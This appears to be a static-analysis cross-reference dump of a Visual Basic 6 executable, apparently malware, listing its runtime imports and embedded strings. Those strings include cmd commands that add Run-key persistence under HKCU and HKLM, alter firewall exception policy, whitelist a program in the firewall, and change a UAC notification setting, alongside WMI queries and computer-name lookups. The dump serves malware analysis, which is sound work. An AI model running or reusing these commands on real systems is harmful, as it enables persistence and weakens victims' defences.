reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x413c21	0x401090	import	0x413ab0	MSVBVM60.DLL.__vbaHresultCheckObj
0x413c7e	0x401090	import	0x413ab0	MSVBVM60.DLL.__vbaHresultCheckObj
0x413ca9	0x401260	import	0x413ab0	MSVBVM60.DLL.__vbaNew2
0x413d0f	0x401090	import	0x413ab0	MSVBVM60.DLL.__vbaHresultCheckObj
0x413d6c	0x401090	import	0x413ab0	MSVBVM60.DLL.__vbaHresultCheckObj
0x413d9b	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x413da6	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x413db6	0x401070	import	0x413ab0	MSVBVM60.DLL.__vbaStrCat
0x413dc1	0x40130c	import	0x413ab0	MSVBVM60.DLL.__vbaStrMove
0x413dcc	0x401070	import	0x413ab0	MSVBVM60.DLL.__vbaStrCat
0x413dd7	0x40130c	import	0x413ab0	MSVBVM60.DLL.__vbaStrMove
0x413de3	0x401070	import	0x413ab0	MSVBVM60.DLL.__vbaStrCat
0x413dee	0x40130c	import	0x413ab0	MSVBVM60.DLL.__vbaStrMove
0x413df5	0x401298	import	0x413ab0	MSVBVM60.DLL.rtcFileCopy
0x413e15	0x401294	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStrList
0x413e28	0x401054	import	0x413ab0	MSVBVM60.DLL.__vbaFreeObjList
0x413e34	0x40102c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVar
0x413e5a	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x413e65	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x413e6c	0x401350	import	0x413ab0	MSVBVM60.DLL.rtcSetFileAttr
0x413e75	0x40134c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStr
0x413e7e	0x40102c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVar
0x413ea1	0x40102c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVar
0x413ec1	0x401260	import	0x413ab0	MSVBVM60.DLL.__vbaNew2
0x413f27	0x401090	import	0x413ab0	MSVBVM60.DLL.__vbaHresultCheckObj
0x413f84	0x401090	import	0x413ab0	MSVBVM60.DLL.__vbaHresultCheckObj
0x413faf	0x401260	import	0x413ab0	MSVBVM60.DLL.__vbaNew2
0x414015	0x401090	import	0x413ab0	MSVBVM60.DLL.__vbaHresultCheckObj
0x414072	0x401090	import	0x413ab0	MSVBVM60.DLL.__vbaHresultCheckObj
0x414097	0x401070	import	0x413ab0	MSVBVM60.DLL.__vbaStrCat
0x4140a2	0x40130c	import	0x413ab0	MSVBVM60.DLL.__vbaStrMove
0x4140ad	0x401070	import	0x413ab0	MSVBVM60.DLL.__vbaStrCat
0x4140b8	0x40130c	import	0x413ab0	MSVBVM60.DLL.__vbaStrMove
0x4140c4	0x401070	import	0x413ab0	MSVBVM60.DLL.__vbaStrCat
0x4140cf	0x40130c	import	0x413ab0	MSVBVM60.DLL.__vbaStrMove
0x4140fb	0x401294	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStrList
0x41410e	0x401054	import	0x413ab0	MSVBVM60.DLL.__vbaFreeObjList
0x41411a	0x40102c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVar
0x414142	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x41414d	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x414166	0x40134c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStr
0x414176	0x401040	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVarList
0x4141a2	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x4141ad	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x4141c2	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x4141e2	0x401294	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStrList
0x4141f5	0x401040	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVarList
0x414220	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x41422b	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x414240	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x414260	0x401294	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStrList
0x414273	0x401040	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVarList
0x414296	0x401260	import	0x413ab0	MSVBVM60.DLL.__vbaNew2
0x4142c0	0x407610	string	0x413ab0	DUMPSCANNER
0x41437f	0x401090	import	0x413ab0	MSVBVM60.DLL.__vbaHresultCheckObj
0x41439f	0x401268	import	0x413ab0	MSVBVM60.DLL.__vbaVar2Vec
0x4143ad	0x401030	import	0x413ab0	MSVBVM60.DLL.__vbaAryMove
0x4143b6	0x40102c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVar
0x4143d5	0x401264	import	0x413ab0	MSVBVM60.DLL.rtcFreeFile
0x4143e2	0x40102c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVar
0x414418	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x41442d	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x414434	0x401034	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarMove
0x41443f	0x40130c	import	0x413ab0	MSVBVM60.DLL.__vbaStrMove
0x41444f	0x401254	import	0x413ab0	MSVBVM60.DLL.__vbaFileOpen
0x414458	0x40134c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStr
0x414468	0x401040	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVarList
0x414488	0x401160	import	0x413ab0	MSVBVM60.DLL.__vbaPutOwner4
0x41449a	0x40113c	import	0x413ab0	MSVBVM60.DLL.__vbaFileClose
0x4144ad	0x401128	import	0x413ab0	MSVBVM60.DLL.__vbaErase
0x4144e5	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x4144fa	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x414505	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x41450c	0x401350	import	0x413ab0	MSVBVM60.DLL.rtcSetFileAttr
0x414515	0x40134c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStr
0x414525	0x401040	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVarList
0x41454d	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x414554	0x401034	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarMove
0x41455f	0x40130c	import	0x413ab0	MSVBVM60.DLL.__vbaStrMove
0x41456c	0x401254	import	0x413ab0	MSVBVM60.DLL.__vbaFileOpen
0x414575	0x40134c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStr
0x41457e	0x40102c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVar
0x4145b4	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x4145c9	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x4145da	0x401020	import	0x413ab0	MSVBVM60.DLL.__vbaVarMove
0x4145ea	0x401040	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVarList
0x414636	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x414648	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x414656	0x4011f4	import	0x413ab0	MSVBVM60.DLL.__vbaPrintFile
0x414669	0x401040	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVarList
0x41467b	0x40113c	import	0x413ab0	MSVBVM60.DLL.__vbaFileClose
0x4146a1	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x4146ac	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x4146b3	0x401350	import	0x413ab0	MSVBVM60.DLL.rtcSetFileAttr
0x4146bc	0x40134c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStr
0x4146c5	0x40102c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVar
0x4146ea	0x401234	import	0x413ab0	MSVBVM60.DLL.__vbaVarCat
0x4146fb	0x401020	import	0x413ab0	MSVBVM60.DLL.__vbaVarMove
0x414704	0x40102c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVar
0x414737	0x404ca4	string	0x413ab0	ѭԧ\r\v blocks=Cyrillic,Cyrillic Supplement,Basic Latin
0x414747	0x401090	import	0x413ab0	MSVBVM60.DLL.__vbaHresultCheckObj
0x414769	0x4012b4	import	0x413ab0	MSVBVM60.DLL.__vbaI4Var
0x41477e	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x414789	0x4012dc	import	0x413ab0	MSVBVM60.DLL.__vbaStrToAnsi
0x4147a0	0x40122c	import	0x413ab0	MSVBVM60.DLL.__vbaStrVarVal
0x4147ab	0x4012dc	import	0x413ab0	MSVBVM60.DLL.__vbaStrToAnsi
0x4147bb	0x4012dc	import	0x413ab0	MSVBVM60.DLL.__vbaStrToAnsi
0x4147ce	0x401084	import	0x413ab0	MSVBVM60.DLL.__vbaSetSystemError
0x4147ea	0x401294	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStrList
0x414807	0x40102c	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVar
0x414827	0x401294	import	0x413ab0	MSVBVM60.DLL.__vbaFreeStrList
0x41483a	0x401054	import	0x413ab0	MSVBVM60.DLL.__vbaFreeObjList
0x41484d	0x401040	import	0x413ab0	MSVBVM60.DLL.__vbaFreeVarList
0x41485c	0x4010b8	import	0x413ab0	MSVBVM60.DLL.__vbaAryDestruct
0x414869	0x4010b8	import	0x413ab0	MSVBVM60.DLL.__vbaAryDestruct
0x414902	0x401278	import	0x4148a0	MSVBVM60.DLL.__vbaStrCopy
0x414927	0x407b44	string	0x4148a0	winmgmts:
0x41493b	0x4012d8	import	0x4148a0	MSVBVM60.DLL.__vbaVarDup
0x41494d	0x401068	import	0x4148a0	MSVBVM60.DLL.rtcGetObject
0x414966	0x407b58	string	0x4148a0	ExecQuery
0x414976	0x4012f0	import	0x4148a0	MSVBVM60.DLL.__vbaVarLateMemCallLd
0x41498a	0x40116c	import	0x4148a0	MSVBVM60.DLL.__vbaObjVar
0x414995	0x4010f4	import	0x4148a0	MSVBVM60.DLL.__vbaObjSetAddref
0x4149ad	0x401040	import	0x4148a0	MSVBVM60.DLL.__vbaFreeVarList
0x4149c5	0x40110c	import	0x4148a0	MSVBVM60.DLL.__vbaForEachCollVar
0x4149cb	0x40130c	import	0x4148a0	MSVBVM60.DLL.__vbaStrMove
0x4149d9	0x407b6c	string	0x4148a0	Caption
0x4149e9	0x401034	import	0x4148a0	MSVBVM60.DLL.__vbaStrVarMove
0x4149f9	0x40102c	import	0x4148a0	MSVBVM60.DLL.__vbaFreeVar
0x414a0a	0x401170	import	0x4148a0	MSVBVM60.DLL.__vbaNextEachCollVar
0x414a1e	0x407b80	string	0x4148a0	Microsoft
0x414a24	0x4011ec	import	0x4148a0	MSVBVM60.DLL.rtcReplace
0x414a4d	0x4012ec	import	0x4148a0	MSVBVM60.DLL.__vbaVarCopy
0x414a63	0x40102c	import	0x4148a0	MSVBVM60.DLL.__vbaFreeVar
0x414a7b	0x401040	import	0x4148a0	MSVBVM60.DLL.__vbaFreeVarList
0x414a85	0x401348	import	0x4148a0	MSVBVM60.DLL.__vbaFreeObj
0x414a96	0x40102c	import	0x4148a0	MSVBVM60.DLL.__vbaFreeVar
0x414a9c	0x40134c	import	0x4148a0	MSVBVM60.DLL.__vbaFreeStr
0x414b33	0x401278	import	0x414af0	MSVBVM60.DLL.__vbaStrCopy
0x414b4e	0x401020	import	0x414af0	MSVBVM60.DLL.__vbaVarMove
0x414b65	0x4010e0	import	0x414af0	MSVBVM60.DLL.__vbaObjSet
0x414b8c	0x401090	import	0x414af0	MSVBVM60.DLL.__vbaHresultCheckObj
0x414bad	0x401348	import	0x414af0	MSVBVM60.DLL.__vbaFreeObj
0x414bca	0x4010e0	import	0x414af0	MSVBVM60.DLL.__vbaObjSet
0x414bf2	0x401090	import	0x414af0	MSVBVM60.DLL.__vbaHresultCheckObj
0x414c00	0x40114c	import	0x414af0	MSVBVM60.DLL.__vbaStrCmp
0x414c12	0x40134c	import	0x414af0	MSVBVM60.DLL.__vbaFreeStr
0x414c1b	0x401348	import	0x414af0	MSVBVM60.DLL.__vbaFreeObj
0x414c3a	0x401020	import	0x414af0	MSVBVM60.DLL.__vbaVarMove
0x414c63	0x40102c	import	0x414af0	MSVBVM60.DLL.__vbaFreeVar
0x414c6c	0x40134c	import	0x414af0	MSVBVM60.DLL.__vbaFreeStr
0x414c75	0x401348	import	0x414af0	MSVBVM60.DLL.__vbaFreeObj
0x414c7f	0x40134c	import	0x414af0	MSVBVM60.DLL.__vbaFreeStr
0x414d13	0x4010e0	import	0x414cc0	MSVBVM60.DLL.__vbaObjSet
0x414d3a	0x401090	import	0x414cc0	MSVBVM60.DLL.__vbaHresultCheckObj
0x414d51	0x401348	import	0x414cc0	MSVBVM60.DLL.__vbaFreeObj
0x414d5c	0x414efe	string	0x414cc0	h9OA
0x414d77	0x4010e0	import	0x414cc0	MSVBVM60.DLL.__vbaObjSet
0x414d9e	0x401090	import	0x414cc0	MSVBVM60.DLL.__vbaHresultCheckObj
0x414dbf	0x401348	import	0x414cc0	MSVBVM60.DLL.__vbaFreeObj
0x414ddd	0x4010e0	import	0x414cc0	MSVBVM60.DLL.__vbaObjSet
0x414e05	0x401090	import	0x414cc0	MSVBVM60.DLL.__vbaHresultCheckObj
0x414e19	0x4010e0	import	0x414cc0	MSVBVM60.DLL.__vbaObjSet
0x414e41	0x401090	import	0x414cc0	MSVBVM60.DLL.__vbaHresultCheckObj
0x414e4f	0x40114c	import	0x414cc0	MSVBVM60.DLL.__vbaStrCmp
0x414e68	0x401294	import	0x414cc0	MSVBVM60.DLL.__vbaFreeStrList
0x414e78	0x401054	import	0x414cc0	MSVBVM60.DLL.__vbaFreeObjList
0x414ebc	0x4010e0	import	0x414cc0	MSVBVM60.DLL.__vbaObjSet
0x414ee0	0x401090	import	0x414cc0	MSVBVM60.DLL.__vbaHresultCheckObj
0x414ee9	0x401348	import	0x414cc0	MSVBVM60.DLL.__vbaFreeObj
0x414f0e	0x40102c	import	0x414cc0	MSVBVM60.DLL.__vbaFreeVar
0x414f1e	0x401294	import	0x414cc0	MSVBVM60.DLL.__vbaFreeStrList
0x414f2e	0x401054	import	0x414cc0	MSVBVM60.DLL.__vbaFreeObjList
0x414f9c	0x401278	import	0x414f70	MSVBVM60.DLL.__vbaStrCopy
0x414fbb	0x401070	import	0x414f70	MSVBVM60.DLL.__vbaStrCat
0x414fdb	0x40130c	import	0x414f70	MSVBVM60.DLL.__vbaStrMove
0x414fee	0x40130c	import	0x414f70	MSVBVM60.DLL.__vbaStrMove
0x415004	0x401294	import	0x414f70	MSVBVM60.DLL.__vbaFreeStrList
0x41501d	0x40102c	import	0x414f70	MSVBVM60.DLL.__vbaFreeVar
0x41502d	0x401294	import	0x414f70	MSVBVM60.DLL.__vbaFreeStrList
0x41503a	0x40134c	import	0x414f70	MSVBVM60.DLL.__vbaFreeStr
0x41512d	0x406174	string	0x415070	Microsoft
0x415141	0x4012bc	import	0x415070	MSVBVM60.DLL.rtcGetSetting
0x415147	0x40130c	import	0x415070	MSVBVM60.DLL.__vbaStrMove
0x415158	0x401278	import	0x415070	MSVBVM60.DLL.__vbaStrCopy
0x415161	0x40134c	import	0x415070	MSVBVM60.DLL.__vbaFreeStr
0x41516f	0x40114c	import	0x415070	MSVBVM60.DLL.__vbaStrCmp
0x415182	0x401234	import	0x415070	MSVBVM60.DLL.__vbaVarCat
0x4151ea	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x415207	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x415229	0x4071b0	string	0x415070	computername
0x415239	0x4012d8	import	0x415070	MSVBVM60.DLL.__vbaVarDup
0x415247	0x4010a8	import	0x415070	MSVBVM60.DLL.rtcEnvironVar
0x41528e	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x4152b6	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x415342	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x415363	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x4153bc	0x4071b0	string	0x415070	computername
0x4153cc	0x4012d8	import	0x415070	MSVBVM60.DLL.__vbaVarDup
0x4153e0	0x4010a8	import	0x415070	MSVBVM60.DLL.rtcEnvironVar
0x415457	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x415493	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x4154a8	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x4154bf	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x4154d2	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x4154e5	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x4154fa	0x4071b0	string	0x415070	computername
0x41550a	0x4012d8	import	0x415070	MSVBVM60.DLL.__vbaVarDup
0x415518	0x4010a8	import	0x415070	MSVBVM60.DLL.rtcEnvironVar
0x41554e	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x41556b	0x401294	import	0x415070	MSVBVM60.DLL.__vbaFreeStrList
0x41558a	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x41559f	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x4155b6	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x4155c9	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x4155dc	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x4155f1	0x4071b0	string	0x415070	computername
0x415601	0x4012d8	import	0x415070	MSVBVM60.DLL.__vbaVarDup
0x41560f	0x4010a8	import	0x415070	MSVBVM60.DLL.rtcEnvironVar
0x415645	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x415662	0x401294	import	0x415070	MSVBVM60.DLL.__vbaFreeStrList
0x415681	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x415694	0x401234	import	0x415070	MSVBVM60.DLL.__vbaVarCat
0x4156f4	0x401090	import	0x415070	MSVBVM60.DLL.__vbaHresultCheckObj
0x415702	0x401280	import	0x415070	MSVBVM60.DLL.rtcHexVarFromVar
0x41571a	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x415732	0x401278	import	0x415070	MSVBVM60.DLL.__vbaStrCopy
0x41573b	0x40134c	import	0x415070	MSVBVM60.DLL.__vbaFreeStr
0x41574f	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x4157d9	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x4157f6	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x415818	0x4071b0	string	0x415070	computername
0x415828	0x4012d8	import	0x415070	MSVBVM60.DLL.__vbaVarDup
0x415836	0x4010a8	import	0x415070	MSVBVM60.DLL.rtcEnvironVar
0x415880	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x4158a8	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x415934	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x415955	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x4159b1	0x4071b0	string	0x415070	computername
0x4159c1	0x4012d8	import	0x415070	MSVBVM60.DLL.__vbaVarDup
0x4159d5	0x4010a8	import	0x415070	MSVBVM60.DLL.rtcEnvironVar
0x415a4e	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x415a8a	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x415a9e	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x415abc	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x415acf	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x415ae2	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x415af7	0x4071b0	string	0x415070	computername
0x415b07	0x4012d8	import	0x415070	MSVBVM60.DLL.__vbaVarDup
0x415b15	0x4010a8	import	0x415070	MSVBVM60.DLL.rtcEnvironVar
0x415b4b	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x415b68	0x401294	import	0x415070	MSVBVM60.DLL.__vbaFreeStrList
0x415b87	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x415b9b	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x415bb9	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x415bcc	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x415bdf	0x401070	import	0x415070	MSVBVM60.DLL.__vbaStrCat
0x415bf4	0x4071b0	string	0x415070	computername
0x415c04	0x4012d8	import	0x415070	MSVBVM60.DLL.__vbaVarDup
0x415c12	0x4010a8	import	0x415070	MSVBVM60.DLL.rtcEnvironVar
0x415c48	0x401034	import	0x415070	MSVBVM60.DLL.__vbaStrVarMove
0x415c65	0x401294	import	0x415070	MSVBVM60.DLL.__vbaFreeStrList
0x415c84	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x415ca8	0x406174	string	0x415070	Microsoft
0x415cad	0x40100c	import	0x415070	MSVBVM60.DLL.rtcSaveSetting
0x415ce3	0x401090	import	0x415070	MSVBVM60.DLL.__vbaHresultCheckObj
0x415d69	0x40122c	import	0x415070	MSVBVM60.DLL.__vbaStrVarVal
0x415d7a	0x40134c	import	0x415070	MSVBVM60.DLL.__vbaFreeStr
0x415da0	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x415db9	0x40102c	import	0x415070	MSVBVM60.DLL.__vbaFreeVar
0x415dcd	0x401294	import	0x415070	MSVBVM60.DLL.__vbaFreeStrList
0x415e01	0x401040	import	0x415070	MSVBVM60.DLL.__vbaFreeVarList
0x415e8d	0x401278	import	0x415e50	MSVBVM60.DLL.__vbaStrCopy
0x415e99	0x401314	import	0x415e50	MSVBVM60.DLL.rtcRightCharBstr
0x415e9f	0x40130c	import	0x415e50	MSVBVM60.DLL.__vbaStrMove
0x415eb2	0x40114c	import	0x415e50	MSVBVM60.DLL.__vbaStrCmp
0x415ec5	0x40134c	import	0x415e50	MSVBVM60.DLL.__vbaFreeStr
0x415ed9	0x401070	import	0x415e50	MSVBVM60.DLL.__vbaStrCat
0x415eef	0x401070	import	0x415e50	MSVBVM60.DLL.__vbaStrCat
0x415f04	0x401248	import	0x415e50	MSVBVM60.DLL.rtcDir
0x415f12	0x401144	import	0x415e50	MSVBVM60.DLL.rtcUpperCaseBstr
0x415f25	0x40114c	import	0x415e50	MSVBVM60.DLL.__vbaStrCmp
0x415f3f	0x401294	import	0x415e50	MSVBVM60.DLL.__vbaFreeStrList
0x415f4b	0x40102c	import	0x415e50	MSVBVM60.DLL.__vbaFreeVar
0x415f62	0x401294	import	0x415e50	MSVBVM60.DLL.__vbaFreeStrList
0x415f6e	0x40102c	import	0x415e50	MSVBVM60.DLL.__vbaFreeVar
0x415f78	0x40134c	import	0x415e50	MSVBVM60.DLL.__vbaFreeStr
0x415fcc	0x401278	import	0x415fa0	MSVBVM60.DLL.__vbaStrCopy
0x415ffc	0x401070	import	0x415fa0	MSVBVM60.DLL.__vbaStrCat
0x416002	0x407ca0	string	0x415fa0	cmd /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "
0x41600c	0x40130c	import	0x415fa0	MSVBVM60.DLL.__vbaStrMove
0x41604d	0x4011bc	import	0x415fa0	MSVBVM60.DLL.rtcShell
0x416063	0x401294	import	0x415fa0	MSVBVM60.DLL.__vbaFreeStrList
0x41606f	0x40102c	import	0x415fa0	MSVBVM60.DLL.__vbaFreeVar
0x416078	0x407d5c	string	0x415fa0	cmd /c REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "
0x4160bb	0x4011bc	import	0x415fa0	MSVBVM60.DLL.rtcShell
0x4160d1	0x401294	import	0x415fa0	MSVBVM60.DLL.__vbaFreeStrList
0x4160dd	0x40102c	import	0x415fa0	MSVBVM60.DLL.__vbaFreeVar
0x4160f4	0x40102c	import	0x415fa0	MSVBVM60.DLL.__vbaFreeVar
0x416108	0x401294	import	0x415fa0	MSVBVM60.DLL.__vbaFreeStrList
0x416114	0x40102c	import	0x415fa0	MSVBVM60.DLL.__vbaFreeVar
0x41611b	0x40134c	import	0x415fa0	MSVBVM60.DLL.__vbaFreeStr
0x4161ac	0x401278	import	0x416160	MSVBVM60.DLL.__vbaStrCopy
0x4161bb	0x407e74	string	0x416160	cmd /c REG ADD HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v "DoNotAllowExceptions" /t REG_DWORD /d "0" /f
0x4161cb	0x4012d8	import	0x416160	MSVBVM60.DLL.__vbaVarDup
0x4161d6	0x4011bc	import	0x416160	MSVBVM60.DLL.rtcShell
0x4161e1	0x40102c	import	0x416160	MSVBVM60.DLL.__vbaFreeVar
0x4161ea	0x401070	import	0x416160	MSVBVM60.DLL.__vbaStrCat
0x4161f0	0x408064	string	0x416160	cmd /c REG ADD HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List /v "
0x4161f8	0x40130c	import	0x416160	MSVBVM60.DLL.__vbaStrMove
0x416223	0x408184	string	0x416160	:*:Enabled:
0x41623f	0x401234	import	0x416160	MSVBVM60.DLL.__vbaVarCat
0x416266	0x4011bc	import	0x416160	MSVBVM60.DLL.rtcShell
0x41627c	0x401294	import	0x416160	MSVBVM60.DLL.__vbaFreeStrList
0x416290	0x401040	import	0x416160	MSVBVM60.DLL.__vbaFreeVarList
0x4162aa	0x40102c	import	0x416160	MSVBVM60.DLL.__vbaFreeVar
0x4162be	0x401294	import	0x416160	MSVBVM60.DLL.__vbaFreeStrList
0x4162d2	0x401040	import	0x416160	MSVBVM60.DLL.__vbaFreeVarList
0x4162df	0x40134c	import	0x416160	MSVBVM60.DLL.__vbaFreeStr
0x41634c	0x4012d8	import	0x416320	MSVBVM60.DLL.__vbaVarDup
0x416378	0x4011bc	import	0x416320	MSVBVM60.DLL.rtcShell
0x41637e	0x40102c	import	0x416320	MSVBVM60.DLL.__vbaFreeVar
0x416391	0x40832c	string	0x416320	cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Security Center" /v "UACDisableNotify" /t REG_DWORD /d "0" /f
0x4163a3	0x4011bc	import	0x416320	MSVBVM60.DLL.rtcShell
0x4163c1	0x40102c	import	0x416320	MSVBVM60.DLL.__vbaFreeVar
0x4163ca	0x40102c	import	0x416320	MSVBVM60.DLL.__vbaFreeVar
0x416471	0x4010d4	import	0x416410	MSVBVM60.DLL.rtcRandomize
0x416477	0x40102c	import	0x416410	MSVBVM60.DLL.__vbaFreeVar
0x416490	0x4010c8	import	0x416410	MSVBVM60.DLL.rtcRandomNext
0x4164a6	0x401334	import	0x416410	MSVBVM60.DLL.__vbaFPInt
0x4164ca	0x401020	import	0x416410	MSVBVM60.DLL.__vbaVarMove
0x4164ea	0x4012d8	import	0x416410	MSVBVM60.DLL.__vbaVarDup
0x4164f4	0x4010b0	import	0x416410	MSVBVM60.DLL.rtcEnvironBstr
